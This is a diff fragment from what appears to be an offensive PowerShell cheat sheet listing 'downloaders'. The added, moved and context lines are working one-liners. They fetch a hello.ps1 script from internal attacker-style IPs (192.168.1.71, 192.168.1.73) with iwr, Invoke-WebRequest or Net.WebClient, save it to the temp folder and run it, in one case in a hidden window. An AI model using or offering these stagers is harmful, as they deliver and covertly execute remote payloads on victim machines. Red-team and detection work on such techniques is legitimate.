@@ -2112,11 +2112,13 @@ Here we can view the all process of encoding/decoding in powershell console
 
 Powershell Downloaders<br />
 
+      iwr -Uri http://192.168.1.71/hello.ps1 -OutFile $env:tmp\hello.ps1
+
       Invoke-WebRequest "http://192.168.1.71/hello.ps1" -OutFile "$env:tmp\hello.ps1" -PassThru;Start-Sleep 1;powershell -File $env:tmp\hello.ps1
 
-      powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://192.168.1.73/hello.ps1', '%tmp%\hello.ps1');powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
-
       powershell Invoke-WebRequest -H @{"Authorization"="token 123456789012345678901234567890"} https://path/to/file.txt -OutFile C:\file.txt
+
+      powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://192.168.1.73/hello.ps1', '%tmp%\hello.ps1');powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
 
 COM Donwloaders<br />
 
